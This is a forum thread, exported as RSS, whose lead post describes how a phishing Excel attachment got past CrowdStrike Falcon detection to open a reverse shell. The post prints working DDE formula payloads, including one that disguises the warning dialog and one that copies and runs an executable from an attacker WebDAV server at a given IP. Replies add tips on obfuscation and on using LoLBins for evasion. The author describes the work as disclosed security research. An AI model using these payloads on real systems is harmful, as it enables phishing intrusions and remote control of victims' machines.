<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
    <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802</link>
    <description>**Update 2019/01/14**: Crowdstrike asked me to share an official statement:
_“We appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program [www.hackerone.com/crowdstrike](http://www.hackerone.com/crowdstrike) or via bugs@crowdstrike.com that can be used by researchers to report any issues directly to us and get a monetary reward. We also would like to point out that while CrowdStrike Falcon did not originally show a UI detection for the establishment of the shell (it did record all the activity with the EDR part of the solution), we believe that follow-on adversary activity would have been easily picked up by the product. We love engaging with the researcher community to continue making Falcon the best endpoint security solution on the market - thank you for the feedback!”_

**Update 2019/01/22**: I have confirmation that the two main competitors did not catch it either.


Crowdstrike Falcon is part of a new wave of endpoint security solutions that attempt to detect and block unusual activity using machine-learning and behavioral analysis (at least, that&#39;s what the vendors say).

I can confirm that well known and used living off the land tactics (think Powershell, WScript, Bitsadmin, mshta, etc.) generally won&#39;t be successful if Falcon is installed on the target. It will make a threat actor&#39;s life a lot harder. It&#39;s probably the same with other similar solutions such as Carbon Black, Cylance, etc.

When I say bypassing, I mean completely bypass detection, from the phishing email received by the user to the reverse shell. Something realistic, not just writing a malware and see if it gets executed.

So if we can&#39;t use the classic techniques, about trying some new (old) trick?

Turns out, it was pretty trivial ¯\\\_(ツ)_/¯.

&lt;h2&gt;The setup&lt;/h2&gt;

Attacker:
- A cheap VPS (found on LowEndBox) with Apache 2 and mod_webdav enabled and configured
- A Python reverse shell packaged as single binary with `pyinstaller --onefile`
- Crafted Excel file

Target VM:
- Windows 10 1803 with all the security fixes, up to date
- Crowdstrike Falcon Sensor (latest version)
- Excel 2016 fully patched, Outlook configured with my corporate mailbox

&lt;h2&gt;Step 1. The attachment&lt;/h2&gt;
This time I decided to go with something less-known and a bit more tricky than a simple macro. I wanted to be sure it wouldn&#39;t be caught by the company&#39;s email filter and Windows Defender. I knew there was a chance that it would be caught by Falcon but I decided to try anyway. 

So I decided to use a trick I had observed during the Hancitor campaign a while ago, which is leveraging the Dynamic Data Exchange (DDE) feature instead of a macro. 

My first attempt was to use it by inserting a formula in a Word document (CTRL+F9) in which I&#39;d simply have to insert the following line:

`{DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k notepad.exe&quot;}`

Unfortunately, Notepad didn&#39;t launch. After a quick search, I saw that Microsoft had [shipped a patch](https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/) in December 2017 that disabled the feature in Word.

So if it&#39;s disabled in Word... what about Excel?

Second try, inserting a formula in Excel:

`=cmd|&#39;/c notepad.exe&#39;!_xlbgnm.A1`

It worked!

To make things more credible to the user, it&#39;s possible to manipulate the message displayed in the warning box for the user.

Originally, the message displayed is the following:
![image|613x62](upload://qIbyLKFn8aze52AIZVLAoQc1ucd.png) 

However, it&#39;s possible to replace the CMD.EXE with EXCEL.EXE to make things more credible using:
` =EXCEL|&#39;\..\..\..\Windows\System32\cmd.exe /c notepad.exe&#39;!_xlbgnm.A1`

Now, that&#39;s seem a bit more legit:
![image|614x62](upload://qXPGVXr1zwv6uF7VTUlymxaZN97.png) 

So I had a way to execute code through an attachment, assuming the user would click Yes to the warning message without reading. Now, about using this to download and execute the payload?


&lt;h2&gt;Step 2. WebDAV&lt;/h2&gt;
Why WebDAV? Assuming all the popular, living off the land tactics, wouldn&#39;t work and I would get caught, I started to think about a different way of doing things. Then, I remembered that Windows can connect and browse WebDAV servers using Explorer. Can you see what I&#39;m getting at?

I set up a small VPS with Apache and the mod_webdav module. Then, I changed ports.conf to free port 443, which I used to listen on with Netcat.

&lt;h2&gt;Step 3. Executing a reverse shell&lt;/h2&gt;
Making a reverse shell was easy. All I had to do is use some Python reverse shell code that works on Windows. There are plenty laying around on GitHub or pentesting blogs. Why Python? It was less likely to be detected. Then, on a Windows machine, I created a standalone executable using PyInstaller  with the `pyinstaller --onefile run.py` command.

Once the shell was ready, I uploaded it to the root of the WebDAV folder.

Now I  had to see if it could be executed through WebDAV. On the victim VM:

`=cmd|&#39;/c cmd.exe /c &quot;\\167.160.187.142\\webdav\run.exe&quot;&#39;!_xlbgnm.A1`

Not working. Why? I run the command in the command prompt and I see:
```
The specified path does not exist.
Check the path, and then try again.
```

Yet the payload was there. So after a bit of Google search I found [this article](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee844140(v=ws.10)) on TechNet and figured all I had to do was rename the file to `run.txt`, copy the file on the machine (it&#39;s a network location after all!) and execute it locally. It worked.

`=cmd|&#39;/c cmd.exe /c &quot;copy \\167.160.187.142\webdav\run.txt c:\users\public\run.exe&quot; &amp;&amp; cmd.exe /c &quot;c:\users\public\run.exe&quot;&#39;!_xlbgnm.A1`


&lt;h2&gt;Step 4. Putting the pieces together&lt;/h2&gt;
Crowdstrike Falcon uses behavioral analysis to detect malicious Office documents that try to execute code. For example, if the process execution tree is the following:

explorer.exe &gt; outlook.exe &gt; excel.exe &gt; powershell.exe -windowstyle hidden -executionpolicy bypass -enc

Is it because of the execution flow or simply because of the Powershell arguments? That&#39;s unclear.

That said, the following worked:
- Created an email from a junk mailbox and attached the &quot;malicious&quot; Excel file to it.
- Sent the email to a corporate mailbox
- Open the email from the corporate mailbox in Outlook, open the attachment, click &quot;Yes&quot; on the warning popup.
- Wait
- Get a shell on the machine.

Wait! What? It worked? Something must be wrong. I then make sure the Falcon service is running. It is. I go check the host in the Falcon dashboard see if it still is communicating, it is. So I try again. Yup, still works.

![](//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/a/a8893abe41da5ed30391c01ff9fea2666cfd559b.gif)

What Falcon saw and the reverse shell:
&lt;h5&gt;(sorry for the potato screenshots, had to stich them together as new users can only post 1 image)&lt;/h5&gt;

![image|690x291](upload://fo2iUlR6SPS8VpQxkxhH0JVc5Lh.png) 

While not a vulnerability, I decided to wait before writing this post and reported the bypass technique to Crowdstrike on December 21st 2018 so it&#39;s not being abused by any bad actors (although they might have found it on their own). Crowdstrike confirmed that the bypass was valid and patched it on January 11th 2019.

If any of you can test with Carbon Black and other similar products, please let me know the results!




Edit 2019/01/14: 
- Added an explanation on how to manipulate the warning message box to replace CMD.EXE with EXCEL.EXE
- Added Crowdstrike official statement

Edit 2019/01/22:
- I got confirmation the two main competitors did not caught it either.</description>
    
    <lastBuildDate>Wed, 16 Jan 2019 21:56:50 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/22</link>
        <pubDate>Sun, 10 Feb 2019 21:20:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-22</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[hunter]]></dc:creator>
        <description><![CDATA[
            <p>That’s some red team thinking you’ve done there. Keep up the good work <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/21</link>
        <pubDate>Wed, 16 Jan 2019 21:56:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-21</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[Pppppp]]></dc:creator>
        <description><![CDATA[
            <p>Inline obfuscation works for Excel DDEs. See <a href="https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation" rel="nofollow noopener">https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation</a></p>
<p>To satisfy OP’s curiosity about half of the Endpoint products in the space currently have protection for Excel.exe -&gt; cmd.exe, including Carbon Black. More have protection for Winword.exe -&gt; cmd.exe and less have protection for Outlook.exe -&gt; cmd.exe. So Outlook DDEs are great since Outlook is often overlooked.<br>
If you use the uncommon LoLBins found at <a href="https://lolbas-project.github.io/" rel="nofollow noopener">https://lolbas-project.github.io/</a> DDEs will have success against any product.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/20</link>
        <pubDate>Wed, 16 Jan 2019 13:12:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-20</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[GianniScavo]]></dc:creator>
        <description><![CDATA[
            <p>is there a way for obfuscate the string ? ( =cmd|’/c cmd.exe /c “\167.160.187.142\webdav\run.exe”’!_xlbgnm.A1 )</p>
<p>thanks</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/19</link>
        <pubDate>Tue, 15 Jan 2019 11:26:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-19</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[GetTheGuru]]></dc:creator>
        <description><![CDATA[
            <p>Hi, I think it depends - in Excel 2016 via office 365 has it in by default but the standalone installer which most enterprises use don’t have it. At least that’s my experience so far. Nice post.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/18</link>
        <pubDate>Tue, 15 Jan 2019 07:08:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-18</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[Alfred_Kayuan]]></dc:creator>
        <description><![CDATA[
            <p>After thinking through i went to Trust Security center Option and found this</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d061fc93f07e809da66e911d832687823ad36dc.png" alt="Excel-DDE" data-base62-sha1="hQ0NTwLZLyTKDSOcQuKQa9yMBSQ" width="646" height="500"></p>
<p>after checking that it works. so for some reason i do not understand how that possibly got UNchecked in the first place and i have seen people make a test on 2016 excel which works</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/17</link>
        <pubDate>Mon, 14 Jan 2019 19:31:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-17</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Unfortunately I don’t know the specifics but Microsoft describes how to do it in a security advisory from 2 years ago:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440#mitigating-dde-attack-scenarios" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440#mitigating-dde-attack-scenarios" target="_blank" rel="noopener nofollow ugc">Microsoft Security Advisory 4053440</a></h3>

<p>Microsoft is releasing this security advisory to provide information regarding security settings for Microsoft Office applications. This advisory provides guidance on what users can do to ensure that these applications are properly secured when...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>Hope it helps!</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/16</link>
        <pubDate>Mon, 14 Jan 2019 17:39:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-16</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[ThunderSon]]></dc:creator>
        <description><![CDATA[
            <p>My question falls there exactly. How can you secure your Windows system against that by using GPOs and user restrictions? Reading as well on DDE since I am barely aware of it. Thank you for the extra bit as well!</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/15</link>
        <pubDate>Mon, 14 Jan 2019 17:13:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-15</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>I’m not sure I understand the question very well but I’ll try to answer. The reason DDE is used is because the environment has the macros disabled by GPO. The GPOs in question I believe are:</p>
<ul>
<li><em>Block macros from running in Office files from the Internet</em></li>
<li><em>Disable VBA for Office applications</em></li>
<li>
<em>VBA Macro Notification Settings</em> set to <em>Disable all with notification</em>
</li>
</ul>
<p>As far as I know and as shown in my reply to Alfred above, by default DDE execution of external content is enabled by default. It will however create a pop-up message asking the user if he wishes to run cmd.exe (but as you know most people click stuff without reading) like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" alt="image" data-base62-sha1="qIbyLKFn8aze52AIZVLAoQc1ucd" width="613" height="62"></p>
<p>There is also a way to manipulate that message to replace cmd.exe with excel.exe using the following line:<br>
<code>=EXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!_xlbgnm.A1</code></p>
<p>Then…<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcfc02745f82dd67c3a43bdaf796c6eb22543511.png" alt="image" data-base62-sha1="qXPGVXr1zwv6uF7VTUlymxaZN97" width="614" height="62"></p>
<p>Much more credible, isn’t it?</p>
<p>I will edit the article to add it.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/14</link>
        <pubDate>Mon, 14 Jan 2019 16:56:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-14</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[guly]]></dc:creator>
        <description><![CDATA[
            <p>–edit: removed because not relevant</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/13</link>
        <pubDate>Mon, 14 Jan 2019 16:35:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-13</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[ThunderSon]]></dc:creator>
        <description><![CDATA[
            <p>Hello. Nice write-up and finding! Are you aware of what GPOs this can bypass? What is a solution that can block execution from the GPO’s level without bricking excel? I can’t fully test this since I don’t have the proper environment for it, yet it seems to be a bypass …</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/12</link>
        <pubDate>Mon, 14 Jan 2019 16:10:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-12</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Just did a fresh install in a VM on Windows 10 Pro fully patched and I don’t have the issue.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/96b68198cda08808004801a4327518a81a267178.png" alt="image" data-base62-sha1="lvgDzVuoyHT8cz7ySCIsiTIUeaQ" width="608" height="499"></p>
<p>You probably have a GPO that adds two additional check boxes (within the red box I added on the picture) to enable/disable the DDE server lookup and launch. The DDE server launch one if probably not checked (which is a good thing).</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/11</link>
        <pubDate>Mon, 14 Jan 2019 15:27:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-11</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>These were the first ones I used! Excellent article by the way. I did try most of the payloads you suggested and compiling them on the fly with <code>Microsoft.Workflow.Compiler.exe</code> and even tried with <code>csc.exe</code> in the .NET folder. Unfortunately they were all detected. Crowdstrike prevented the execution on my machine so I’m surprised it didnt show up in Virus Total but my tests are fairly recent.</p>
<p>However, I have an idea that I want to test and it might work well with your payloads. Instead compiling on the fly with both of these, about using the IL disassembly and recompile it on the fly instead or compiling the code itself?</p>
<p>If it works I’ll probably do another write up and give you credit for some ideas <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/10</link>
        <pubDate>Mon, 14 Jan 2019 14:28:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-10</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Interesting!</p>
<p>Did you test in a fresh install or on a pre-configured machine? Depending on the organization and GPOs that are pushed for Office, the execution of external DDE servers might be disabled by default. In the organization where I tested, macros are disabled by default but external DDE servers are enabled and the settings can’t be controlled by the user. It’s a feature often used in financial institutions. You can go enable it in the Options &gt; Trust Center &gt; External content.</p>
<p>I’m not sure what the defaults are on a fresh Office install on a non domain-connect machine. I’m building a VM with a fresh Office 2016 without connecting it to the domain so we’ll see.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/9</link>
        <pubDate>Mon, 14 Jan 2019 13:47:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-9</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[Bank_Security]]></dc:creator>
        <description><![CDATA[
            <p>Nice article!! Excellent as a starting point for a red team. If you may be interested, I would like to share my research similar to this one.</p>
<p>Undetectable C# &amp; C++ Reverse Shells:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
      <a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener nofollow ugc" title="02:20PM - 06 August 2020">Medium – 6 Aug 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dba6c5bca5844abc412903ca5ab3e1450fea2171.png" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15" target="_blank" rel="noopener nofollow ugc">Undetectable C# &amp; C++ Reverse Shells</a></h3>

<p>Technical overview of different way to spawn a reverse shell on a victim machine</p>

  <p><span class="label1">Reading time: 7 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/8</link>
        <pubDate>Mon, 14 Jan 2019 11:40:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-8</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>If you want more articles like these, please consider funding us these products (anti-virus, anti-malware, anti-xyz, Microsoft Office, (mail) servers, licensed Cobalt Strike, etc.) <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/7</link>
        <pubDate>Mon, 14 Jan 2019 10:17:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-7</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[Alfred_Kayuan]]></dc:creator>
        <description><![CDATA[
            <p>still don’t get how you get to run DDE in excel 2016? been testing this for awhile and no luck. Excel 2016 windows10 16299</p>
<p>this is what i keep getting</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9349e9b5fc470bfac5e33dfa3cedbf19ee9a3937.png" alt="excel" data-base62-sha1="l0YxQnEGoXLYbAwbyHXkyRJw367" width="690" height="338"></p>
<p>a good advice is needed</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/6</link>
        <pubDate>Mon, 14 Jan 2019 05:29:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-6</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Thank you! I will definitely test again in the coming days <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/5</link>
        <pubDate>Sun, 13 Jan 2019 02:22:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-5</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Hey thanks! I don’t have much experience at writing this kind of article in general so I appreciate any feedback. Please try with whatever product you can. I’d be curious to know the results and I think it’s really important to properly test these products (meaning not using the usual techniques) considering how much they cost and all the buzzwords they use to sell them. In Crowdstrike’s case, I was pleasantly surprised with they’re quick answer and collaboration on the subject.</p>
<p>Regarding HTAs and XSLs, I previously read one of your articles on the subject a while ago and I did some tests where Falcon had caught them all. I never tried to do a macro with RunPE (first time I hear of this project, looks really cool!) but I definitely will. That said, I don’t focus on the macros because they’re easily detected by email filters and a company with good security practice will disable the execution via GPOs but I don’t doubt lots of people are still using them.</p>
<p>I’ll keep you posted by PM when I try in a few days.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/4</link>
